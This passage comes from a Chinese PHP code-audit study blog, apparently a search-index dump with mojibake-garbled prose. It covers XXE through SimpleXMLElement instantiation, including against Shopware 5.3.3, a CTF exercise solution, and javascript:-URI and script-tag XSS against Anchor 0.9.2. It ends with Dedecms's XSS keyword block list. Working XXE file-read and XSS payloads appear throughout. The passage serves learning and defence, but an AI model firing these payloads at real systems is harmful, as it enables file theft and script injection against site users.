æ—¶ï¼Œåˆ™ä¸è°ƒç”¨ __autoload å‡½æ•°ã€‚ ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œclass_exist()ä¼šç›´æ¥è°ƒç”¨__autoload()å‡½æ•°ï¼Œè€Œ__autoload()å‡½æ•°çš„å‚æ•°å¯ä»¥ç”¨æˆ·å¯æ§çš„ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è·¯å¾„ç©¿è¶Šæ¥åŒ…å«ä»»æ„æ–‡ä»¶ã€‚ ä½¿ç”¨è·¯å¾„ç©¿è¶Šç¬¦å·çš„å‰ææ˜¯PHPç‰ˆæœ¬å°äº5.4 SimpleXMLElementXXEæ¼æ´ ç¬¬9è¡Œä»£ç ä¸­ï¼Œå®ä¾‹åŒ–ç±»çš„ç±»åå’Œå‚æ•°å‡åœ¨ç”¨æˆ·æ§åˆ¶ä¹‹ä¸‹ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¼æ´ï¼Œè°ƒç”¨PHPä»£ç åº“çš„ä»»æ„æ„é€ å‡½æ•°ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨PHPå†…ç½®ç±»SimpleXMLElementè¿›è¡ŒXXEæ”»å‡»ï¼Œè¿›è€Œè¯»å–æ–‡ä»¶å†…å®¹å’Œå‘½ä»¤æ‰§è¡Œï¼ˆPHPå®‰è£…expectæ‰©å±•ï¼‰ã€‚ SimpleXMLElement ï¼š(PHP 5, PHP 7) åŠŸèƒ½ ï¼šç”¨æ¥è¡¨ç¤ºXMLæ–‡æ¡£ä¸­çš„å…ƒç´ ï¼Œä¸ºPHPçš„å†…ç½®ç±»ã€‚ ç”¨æ³•ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œç›´æ¥ä¼ å…¥ä¸€ä¸ªåŒ…å«æ¶æ„payloadçš„XMLä»£ç å³å¯ã€‚ 12345678910&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///E:/phpStudy/PHPTutorial/flag.txt&quot;&gt;]&gt;&lt;x&gt;&amp;xee&lt;/x&gt;EOF;$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT);var_dump($xml_class); 0x02 å®ä¾‹åˆ†æ è¿™æ¬¡çš„å®ä¾‹åˆ†æç”¨åˆ°çš„æ˜¯Shopware 5.3.3ç‰ˆæœ¬ï¼Œåå°ä»£ç å…¶ä¸­æœ‰ä¸€å¤„æä¾›äº†åŠ¨æ€æ–°å»ºç±»çš„å‡½æ•°ï¼Œç„¶è€Œå¹¶æ²¡æœ‰å¯¹æ–°å»ºçš„ç±»è¿›è¡Œé™åˆ¶ï¼Œç”±äºæ–°å»ºçš„ç±»åå’Œä¼ é€’çš„å‚æ•°éƒ½æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œä»è€Œé€ æˆæ¼æ´ã€‚å…¥å£ç‚¹æ˜¯åœ¨engine\\Shopware\\Controllers\\Backend\\ProductStream.phpæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªloadPreviewActionæ–¹æ³•ï¼Œä½œç”¨æ˜¯ç”¨æ¥æµè§ˆäº§å“æµçš„è¯¦ç»†ä¿¡æ¯ã€‚ 12345678910111213141516171819202122232425class Shopware_Controllers_Backend_ProductStream extends Shopware_Controllers_Backend_Application&#123; public function loadPreviewAction() &#123; $conditions = $this-&gt;Request()-&gt;getParam(&#x27;conditions&#x27;); $conditions = json_decode($conditions, true); $sorting = $this-&gt;Request()-&gt;getParam(&#x27;sort&#x27;); $criteria = new Criteria(); /** @var RepositoryInterface $streamRepo */ $streamRepo = $this-&gt;get(&#x27;shopware_product_stream.repository&#x27;); $sorting = $streamRepo-&gt;unserialize($sorting); foreach ($sorting as $sort) &#123; $criteria-&gt;addSorting($sort); &#125; $conditions = $streamRepo-&gt;unserialize($conditions); foreach ($conditions as $condition) &#123; $criteria-&gt;addCondition($condition); &#125;&#125; è¯¥æ–¹æ³•æ¥æ”¶ä»ç”¨æˆ·ä¼ æ¥çš„å‚æ•° sort ï¼Œç„¶åä¼ å…¥ Repository ç±»çš„ unserialize æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›unserialize()æ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨ engine\\Shopware\\Components\\LogawareReflectionHelper.phpï¼š 1234567891011121314151617public function unserialize($serialized, $errorSource) &#123; $classes = []; foreach ($serialized as $className =&gt; $arguments) &#123; $className = explode(&#x27;|&#x27;, $className); $className = $className[0]; try &#123; $classes[] = $this-&gt;reflector-&gt;createInstanceFromNamedArguments($className, $arguments); &#125; catch (\\Exception $e) &#123; $this-&gt;logger-&gt;critical($errorSource . &#x27;: &#x27; . $e-&gt;getMessage()); &#125; &#125; return $classes; &#125; è¿™é‡Œçš„ $serialized å°±æ˜¯æˆ‘ä»¬åˆšåˆšä¼ å…¥çš„ sort ï¼ˆä¸Šå›¾ç¬¬3è¡Œï¼‰ï¼Œç¨‹åºåˆ†åˆ«ä» sort ä¸­æå–å‡ºå€¼èµ‹ç»™ $className å’Œ $arguments å˜é‡ï¼Œç„¶åè¿™ä¸¤ä¸ªå˜é‡è¢«ä¼ å…¥ ReflectionHelper ç±»çš„ createInstanceFromNamedArguments æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›è¿™ä¸ªå‡½æ•°ï¼š 1234567891011121314151617181920212223242526272829public function createInstanceFromNamedArguments($className, $arguments) &#123; $reflectionClass = new \\ReflectionClass($className); if (!$reflectionClass-&gt;getConstructor()) &#123; return $reflectionClass-&gt;newInstance(); &#125; $constructorParams = $reflectionClass-&gt;getConstructor()-&gt;getParameters(); $newParams = []; foreach ($constructorParams as $constructorParam) &#123; $paramName = $constructorParam-&gt;getName(); if (!isset($arguments[$paramName])) &#123; if (!$constructorParam-&gt;isOptional()) &#123; throw new \\RuntimeException(sprintf(&quot;Required constructor Parameter Missing: &#x27;$%s&#x27;.&quot;, $paramName)); &#125; $newParams[] = $constructorParam-&gt;getDefaultValue(); continue; &#125; $newParams[] = $arguments[$paramName]; &#125; return $reflectionClass-&gt;newInstanceArgs($newParams); &#125;&#125; å‡½æ•°çš„ç¬¬ä¸€è¡Œå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªåå°„ç±»ï¼Œè€Œç±»åå°±æ˜¯æ¥è‡ªæˆ‘ä»¬ä¼ å…¥çš„sortå‚æ•°ã€‚æœ€åä¸€å¥returnæ—¶æ ¹æ®å‚æ•°newInstanceArgsåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å®ä¾‹å¯¹è±¡ï¼Œå‚æ•°newInstanceArgsæ˜¯ä»$arguments[$paraName]ä¸­å–å€¼ï¼Œå¹¶ä¸”$argumentsæ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬ä¼ å…¥ç±»åä¸ºSimpleXMLElementæ—¶ï¼Œå®ä¾‹åŒ–åï¼Œä¼šå°†ä¼ å…¥çš„å‚æ•°è¿›è¡Œxmlè§£æã€‚ ä¸­é—´çš„é‚£ä¸€æ®µforå¾ªç¯ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯å¦‚æœæ²¡æœ‰ä¼ å…¥éå¯é€‰å‚æ•°æ—¶ç›´æ¥æŠ¥é”™ï¼Œæ²¡æœ‰ä¼ å…¥éå¯é€‰å‚æ•°æ—¶ä¼šèµ‹é»˜è®¤å€¼ã€‚ å…·ä½“çš„åˆ†ææ–‡ç« ï¼šhttps://www.freebuf.com/vuls/154415.html 0x03 æ¼æ´åˆ©ç”¨ æ­å»ºè¿™ä¸ªç¯å¢ƒèŠ±äº†æˆ‘ä¸€å¤©çš„æ—¶é—´ï¼Œæœ€åè¿˜æ˜¯ç”¨çš„å…¶ä»–å¸ˆå‚…å·²ç»åšå¥½çš„dockeré•œåƒè·‘èµ·æ¥çš„ï¼Œä½†æ˜¯è¿™ä¸ªç¯å¢ƒè¿˜æ˜¯æ²¡æœ‰åŠæ³•è°ƒè¯•ã€‚ ç¯å¢ƒï¼š Windows 10 2004 Docker 2.2.0.5 æ­å»ºæ­¥éª¤ï¼š docker pull gaoxijiejie/shopware:okay docker run -i -t -p 8000:80 gaoxijiejie/shopware bash å½“æˆ‘ä»¬ç‚¹å‡» Refresh preview æŒ‰é’®æ—¶ï¼Œå°±ä¼šè°ƒç”¨ loadPreviewAction æ–¹æ³•ï¼Œç”¨BurpSuiteæŠ“åˆ°åŒ…å¦‚ä¸‹ï¼š å…¶ä¸­ä¸»è¦å°±æ˜¯sortå‚æ•°çš„å€¼ï¼š 1%7B%22Shopware%5C%5CBundle%5C%5CSearchBundle%5C%5CSorting%5C%5CPriceSorting%22%3A%7B%22direction%22%3A%22ASC%22%7D%7D Urlè§£ç ï¼š 1&#123;&quot;Shopware\\\\Bundle\\\\SearchBundle\\\\Sorting\\\\PriceSorting&quot;:&#123;&quot;direction&quot;:&quot;ASC&quot;&#125;&#125; ä¸ºäº†æ„é€ ç±»ä¼¼çš„payloadï¼Œå…ˆæ¥æŸ¥çœ‹SimpleXMLElementç±»çš„æ„é€ å‡½æ•°ï¼š 1final public SimpleXMLElement::__construct ( string $data [, int $options &#x3D; 0 [, bool $data_is_url &#x3D; FALSE [, string $ns &#x3D; &quot;&quot; [, bool $is_prefix &#x3D; FALSE ]]]] ) ä¸ºäº†å‡å°‘Payloadçš„é•¿åº¦ï¼Œæˆ‘ä»¬è¦ä¼ å…¥data_is_url=TRUEä½¿å¾—å¯ä»¥ç”¨URLä¼ å…¥æ¶æ„XMLæ•°æ®ï¼Œé‚£ä¹ˆPayloadå¦‚ä¸‹ï¼š 1&#123;&quot;SimpleXMLElement&quot;:&#123;&quot;data&quot;:&quot;http:&#x2F;&#x2F;172.19.14.43:8000&#x2F;xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0&#125;&#125; xxe.xmlæ–‡ä»¶å†…å®¹ 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;flag.txt&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt; å½“ç„¶è¿™ä¸ªæ˜¯å±äºBlind XXEï¼Œæ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œåªèƒ½ç”¨å¤–éƒ¨DTDæ¥å¤–å¸¦æ•°æ®ï¼Œä½†æ˜¯è¿™ç§æ²¡èƒ½å¤ç°æˆåŠŸï¼Œè€Œä¸”ä¹Ÿä¸èƒ½è°ƒè¯•ï¼Œè›®é—æ†¾çš„ã€‚ 0x04 ç»ƒä¹ é¢˜ 12345678910111213141516171819202122// index.php&lt;?phpclass NotFound&#123; function __construct() &#123; die(&#x27;404&#x27;); &#125;&#125;spl_autoload_register( function ($class)&#123; new NotFound(); &#125;);$classname = isset($_GET[&#x27;name&#x27;]) ? $_GET[&#x27;name&#x27;] : null;$param = isset($_GET[&#x27;param&#x27;]) ? $_GET[&#x27;param&#x27;] : null;$param2 = isset($_GET[&#x27;param2&#x27;]) ? $_GET[&#x27;param2&#x27;] : null;if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.&#x27;=&gt;&#x27;.$value.&#x27;&lt;br&gt;&#x27;;&#125; 1234// f1agi3hEre.php&lt;?php$flag = &quot;HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;&quot;;?&gt; æ ¹æ®ä¸Šé¢çš„çŸ¥è¯†å‚¨å¤‡ï¼Œæˆ‘ä»¬åœ¨ä¸Šå›¾ç¬¬18è¡Œå¤„å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº† class_exists å‡½æ•°æ¥åˆ¤æ–­ç±»æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šè°ƒç”¨ç¨‹åºä¸­çš„ __autoload å‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰ __autoload å‡½æ•°ï¼Œè€Œæ˜¯ç”¨ spl_autoload_register æ³¨å†Œäº†ä¸€ä¸ªç±»ä¼¼ __autoload ä½œç”¨çš„å‡½æ•°ï¼Œå³è¿™é‡Œè¾“å‡º404ä¿¡æ¯ã€‚ PHP è‡ªåŠ¨åŠ è½½ æ·±åº¦æ€»ç»“ é¦–å…ˆæˆ‘ä»¬ç”¨GlobIterator ç±»æœç´¢flagæ–‡ä»¶åå­—ï¼Œæ„é€ æ–¹æ³•å¦‚ä¸‹ï¼š 1public GlobIterator::__construct ( string $pattern [, int $flags &#x3D; FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] ) ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æœç´¢çš„æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºé€‰æ‹©æ–‡ä»¶çš„å“ªä¸ªä¿¡æ¯ä½œä¸ºé”®åï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨å®ƒçš„é»˜è®¤å€¼CURRENT_AS_FILEINFOå³å¯ï¼Œpayloadå¦‚ä¸‹ï¼š 1http:&#x2F;&#x2F;localhost&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;index.php?name&#x3D;GlobIterator&amp;param&#x3D;.&#x2F;*.php ç¬¬äºŒæ­¥ç”¨SimpleXMLElementç±»è¯»å–flagï¼Œè¿™é‡Œå› ä¸ºæ–‡ä»¶ä¸­å­˜åœ¨&lt; &gt; &amp; ' &quot;ç¬¦å·ï¼Œæ‰€ä»¥éœ€è¦å¯¹è¯»å–çš„æ•°æ®è¿›è¡Œbase64ç¼–ç ï¼Œä¸ç„¶ä¼šå¯¼è‡´XMLè§£æå¤±è´¥ï¼Œpayloadï¼š 1http:&#x2F;&#x2F;localhost&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;index.php?name&#x3D;SimpleXMLElement&amp;para&#x3D;?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;E:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;&amp;para2&#x3D;2 ç¬¬ä¸€ä¸ªå‚æ•°çš„å†…å®¹ï¼š 1?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;E:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt; ç¬¬äºŒä¸ªå‚æ•°å®é™…ä¸Šè¿™é‡Œ2å¯¹åº”çš„æ¨¡å¼æ˜¯ LIBXML_NOENTï¼Œå› ä¸ºåœ¨libxml&gt;=2.9.0ä»¥åçš„ç‰ˆæœ¬é»˜è®¤ä¸å¼€å¯å¤–éƒ¨å®ä½“è§£æï¼Œéœ€è¦æ·»åŠ è¿™ä¸ªå‚æ•°å¼€å¯ã€‚","tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"ä»£ç å®¡è®¡/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day2","date":"2020-06-11T09:45:13.000Z","path":"code_audit/4.PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day2/","text":"PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day1 var_filterå‡½æ•°ç¼ºé™· 0x01 Day2 - Twig ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233// composer require &quot;twig/twig&quot;require &#x27;vendor/autoload.php&#x27;;class Template &#123; private $twig; public function __construct() &#123; $indexTemplate = &#x27;&lt;img &#x27; . &#x27;src=&quot;https://loremflickr.com/320/240&quot;&gt;&#x27; . &#x27;&lt;a href=&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&#x27;; // Default twig setup, simulate loading // index.html file from disk $loader = new Twig\\Loader\\ArrayLoader([ &#x27;index.html&#x27; =&gt; $indexTemplate ]); $this-&gt;twig = new Twig\\Environment($loader); &#125; public function getNexSlideUrl() &#123; $nextSlide = $_GET[&#x27;nextSlide&#x27;]; return filter_var($nextSlide, FILTER_VALIDATE_URL); &#125; public function render() &#123; echo $this-&gt;twig-&gt;render( &#x27;index.html&#x27;, [&#x27;link&#x27; =&gt; $this-&gt;getNexSlideUrl()] ); &#125;&#125;(new Template())-&gt;render(); è¿™æ®µä»£ç æ¶‰åŠåˆ°äº†PHPçš„æ¨¡æ¿å¼•æ“Twigï¼Œç›´æ¥æ¥ç®€åŒ–ä¸€ä¸‹ä»£ç ï¼š 1234567&lt;?php $url = filter_var($_GET[&#x27;url&#x27;], FILTER_VALIDATE_URL); var_dump($url); $url = htmlspecialchars($url); var_dump($url); echo &quot;&lt;a href=&#x27;$url&#x27;&gt; Next Slide &lt;/a&gt;&quot;;?&gt; åˆ†åˆ«è§£é‡Šä¸€ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°ï¼š filter_var ï¼š(PHP 5 &gt;= 5.2.0, PHP 7) åŠŸèƒ½ ï¼šä½¿ç”¨ç‰¹å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤ä¸€ä¸ªå˜é‡ å®šä¹‰ ï¼šmixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) htmlspecialchars ï¼š(PHP 4, PHP 5, PHP 7) åŠŸèƒ½ ï¼šå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ å®šä¹‰ ï¼šstring htmlspecialchars ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string$encoding = ini_get(â€œdefault_charsetâ€) [, bool $double_encode = TRUE ]]] ) 12345&gt; &amp; (&amp; ç¬¦å·) &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &amp;&gt; &quot; (åŒå¼•å·) &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &quot;&gt; &#39; (å•å¼•å·) &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &amp;apos;&gt; &lt; (å°äºå·) &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &lt;&gt; &gt; (å¤§äºå·) &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &gt; é’ˆå¯¹è¿™ä¸¤å¤„çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨ javascriptä¼ªåè®® æ¥ç»•è¿‡ã€‚æˆ‘ä»¬ä½¿ç”¨ payload ï¼š?url=javascript://commentï¼…250aalert(1) ï¼Œå¯ä»¥æ‰§è¡Œ alert å‡½æ•°ï¼š è§£é‡Šä¸€ä¸‹è¿™ä¸ªPayloadï¼š è¿™é‡Œçš„ // åœ¨JavaScriptä¸­è¡¨ç¤ºå•è¡Œæ³¨é‡Šï¼Œæ‰€ä»¥åé¢çš„å†…å®¹å‡ä¸ºæ³¨é‡Šï¼Œé‚£ä¸ºä»€ä¹ˆä¼šæ‰§è¡Œ alert å‡½æ•°å‘¢ï¼Ÿé‚£æ˜¯å› ä¸ºæˆ‘ä»¬è¿™é‡Œç”¨äº†å­—ç¬¦ %0a ï¼Œè¯¥å­—ç¬¦ä¸ºæ¢è¡Œç¬¦ï¼Œæ‰€ä»¥ alert è¯­å¥ä¸æ³¨é‡Šç¬¦ // å°±ä¸åœ¨åŒä¸€è¡Œï¼Œå°±èƒ½æ‰§è¡Œã€‚å½“ç„¶ï¼Œè¿™é‡Œæˆ‘ä»¬è¦å¯¹ % ç™¾åˆ†å·ç¼–ç æˆ %25 ï¼Œå› ä¸ºç¨‹åºå°†æµè§ˆå™¨å‘æ¥çš„payloadï¼šjavascript://commentï¼…250aalert(1) å…ˆè§£ç æˆï¼š javascript://comment%0aalert(1) å­˜å‚¨åœ¨å˜é‡ $url ä¸­ï¼ˆä¸Šå›¾ç¬¬äºŒè¡Œä»£ç ï¼‰ï¼Œç„¶åç”¨æˆ·ç‚¹å‡»aæ ‡ç­¾é“¾æ¥å°±ä¼šè§¦å‘ alert å‡½æ•°ã€‚ 0x02 å®ä¾‹åˆ†æ ä»Šå¤©çš„å®ä¾‹ç”¨çš„æ˜¯ Anchor 0.9.2 ç‰ˆæœ¬ï¼Œåœ¨è¯¥ç‰ˆæœ¬ä¸­ï¼Œå½“ç”¨æˆ·è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„URLé“¾æ¥æ—¶ï¼Œç¨‹åºä¼šè°ƒç”¨404æ¨¡æ¿ï¼Œè€Œè¿™ä¸ªæ¨¡æ¿åˆ™å­˜åœ¨XSSæ¼æ´ã€‚é—®é¢˜å­˜åœ¨äº404.phpï¼š 123456789&lt;?php theme_include(&#x27;header&#x27;); ?&gt; &lt;section class=&quot;content wrap&quot;&gt; &lt;h1&gt;Page not found&lt;/h1&gt; &lt;p&gt;Unfortunately, the page &lt;code&gt;/&lt;?php echo current_url(); ?&gt;&lt;/code&gt; could not be found. Your best bet is either to try the &lt;a href=&quot;&lt;?php echo base_url(); ?&gt;&quot;&gt;homepage&lt;/a&gt;, try &lt;a href=&quot;#search&quot;&gt;searching&lt;/a&gt;, or go and cry in a corner (although I donâ€™t recommend the latter).&lt;/p&gt; &lt;/section&gt;&lt;?php theme_include(&#x27;footer&#x27;); ?&gt; current_url()å°†è¯»å–å½“å‰ç¯å¢ƒçš„SERVER['PATH_INFO']çš„å€¼ï¼Œç„¶åå†å›æ˜¾åˆ°é¡µé¢ä¸Šã€‚ åŸæ–‡ä¸­çš„åˆ©ç”¨é“¾æ¶‰åŠå¤šä¸ªå‡½æ•°ï¼Œä½†æ˜¯æˆ‘åœ¨æœ¬åœ°ç¯å¢ƒå¤ç°è¿›è¡Œå•æ­¥è°ƒè¯•æ—¶ï¼Œå´å¹¶æ²¡æœ‰è¿›å…¥åˆ°detect()å‡½æ•°ä¸­ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›äº†currentçš„å€¼ï¼Œå°è¯•äº†å¾ˆå¤šæ¬¡ä¹Ÿæ²¡æ‰¾åˆ°å¤ç°å¤±è´¥çš„åŸå› ï¼Œè¿™é‡Œå…ˆç•™ä¸€ä¸ªå‘ã€‚ Payloadï¼š 1http:&#x2F;&#x2F;localhost&#x2F;anchor&#x2F;index.php&#x2F;&lt;script&gt;alert(&#39;www.sec-redclub.com&#39;)&lt;&#x2F;script&gt; 0x03 é˜²å¾¡æ–¹å¼ å¯¹XSSæ¼æ´ï¼Œæˆ‘ä»¬æœ€å¥½å°±æ˜¯è¿‡æ»¤å…³é”®è¯ï¼Œå°†ç‰¹æ®Šå­—ç¬¦è¿›è¡ŒHTMLå®ä½“ç¼–ç æ›¿æ¢ï¼Œè¿™é‡Œå¼•ç”¨Dedecmsä¸­é˜²å¾¡XSSçš„ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940function RemoveXSS($val) &#123; $val = preg_replace(&#x27;/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/&#x27;, &#x27;&#x27;, $val); $search = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;; $search .= &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;; $search .= &#x27;1234567890!@#$%^&amp;*()&#x27;; $search .= &#x27;~`&quot;;:?+/=&#123;&#125;[]-_|\\&#x27;\\\\&#x27;; for ($i = 0; $i &lt; strlen($search); $i++) &#123; $val = preg_replace(&#x27;/(&amp;#[xX]0&#123;0,8&#125;&#x27;.dechex(ord($search[$i])).&#x27;;?)/i&#x27;, $search[$i], $val); // with a ; $val = preg_replace(&#x27;/(&amp;#0&#123;0,8&#125;&#x27;.ord($search[$i]).&#x27;;?)/&#x27;, $search[$i], $val); // with a ; &#125; $ra1 = array(&#x27;javascript&#x27;, &#x27;vbscript&#x27;, &#x27;expression&#x27;, &#x27;applet&#x27;, &#x27;meta&#x27;, &#x27;xml&#x27;, &#x27;blink&#x27;, &#x27;link&#x27;, &#x27;style&#x27;, &#x27;script&#x27;, &#x27;embed&#x27;, &#x27;object&#x27;, &#x27;iframe&#x27;, &#x27;frame&#x27;, &#x27;frameset&#x27;, &#x27;ilayer&#x27;, &#x27;layer&#x27;, &#x27;bgsound&#x27;, &#x27;title&#x27;, &#x27;base&#x27;); $ra2 = array(&#x27;onabort&#x27;, &#x27;onactivate&#x27;, &#x27;onafterprint&#x27;, &#x27;onafterupdate&#x27;, &#x27;onbeforeactivate&#x27;, &#x27;onbeforecopy&#x27;, &#x27;onbeforecut&#x27;, &#x27;onbeforedeactivate&#x27;, &#x27;onbeforeeditfocus&#x27;, &#x27;onbeforepaste&#x27;, &#x27;onbeforeprint&#x27;, &#x27;onbeforeunload&#x27;, &#x27;onbeforeupdate&#x27;, &#x27;onblur&#x27;, &#x27;onbounce&#x27;, &#x27;oncellchange&#x27;, &#x27;onchange&#x27;, &#x27;onclick&#x27;, &#x27;oncontextmenu&#x27;, &#x27;oncontrolselect&#x27;, &#x27;oncopy&#x27;, &#x27;oncut&#x27;, &#x27;ondataavailable&#x27;, &#x27;ondatasetchanged&#x27;, &#x27;ondatasetcomplete&#x27;, &#x27;ondblclick&#x27;, &#x27;ondeactivate&#x27;, &#x27;ondrag&#x27;, &#x27;ondragend&#x27;, &#x27;ondragenter&#x27;, &#x27;ondragleave&#x27;, &#x27;ondragover&#x27;, &#x27;ondragstart&#x27;, &#x27;ondrop&#x27;, &#x27;onerror&#x27;, &#x27;onerrorupdate&#x27;, &#x27;onfilterchange&#x27;, &#x27;onfinish&#x27;, &#x27;onfocus&#x27;, &#x27;onfocusin&#x27;, &#x27;onfocusout&#x27;, &#x27;onhelp&#x27;, &#x27;onkeydown&#x27;, &#x27;onkeypress&#x27;, &#x27;onkeyup&#x27;, &#x27;onlayoutcomplete&#x27;, &#x27;onload&#x27;, &#x27;onlosecapture&#x27;, &#x27;onmousedown&#x27;, &#x27;onmouseenter&#x27;, &#x27;onmouseleave&#x27;, &#x27;onmousemove&#x27;, &#x27;onmouseout&#x27;, &#x27;onmouseover&#x27;, &#x27;onmouseup&#x27;, &#x27;onmousewheel&#x27;, &#x27;onmove&#x27;, &#x27;onmoveend&#x27;, &#x27;onmovestart&#x27;, &#x27;onpaste&#x27;, &#x27;onpropertychange&#x27;, &#x27;onreadystatechange&#x27;, &#x27;onreset&#x27;, &#x27;onresize&#x27;, &#x27;onresizeend&#x27;, &#x27;onresizestart&#x27;, &#x27;onrowenter&#x27;, &#x27;onrowexit&#x27;, &#x27;onrowsdelete&#x27;, &#x27;onrowsinserted&#x27;, &#x27;onscroll&#x27;, &#x27;onselect&#x27;, &#x27;onselectionchange&#x27;, &#x27;onselectstart&#x27;, &#x27;onstart&#x27;, &#x27;onstop&#x27;, &#x27;onsubmit&#x27;, &#x27;onunload&#x27;); $ra = array_merge($ra1, $ra2); $found = true; while ($found == true) &#123; $val_before = $val; for ($i = 0; $i &lt; sizeof($ra); $i++) &#123; $pattern = &#x27;/&#x27;; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) &#123; if ($j &gt; 0) &#123; $pattern .= &#x27;(&#x27;; $pattern .= &#x27;(&amp;#[xX]0&#123;0,8&#125;([9ab]);)&#x27;; $pattern .= &#x27;|&#x27;; $pattern .= &#x27;|(&amp;#0&#123;0,8&#125;([9|10|13]);)&#x27;; $pattern .= &#x27;)*&#x27;; &#125; $pattern .= $ra[$i][$j]; &#125; $pattern .= &#x27;/i&#x27;; $replacement = substr($ra[$i], 0, 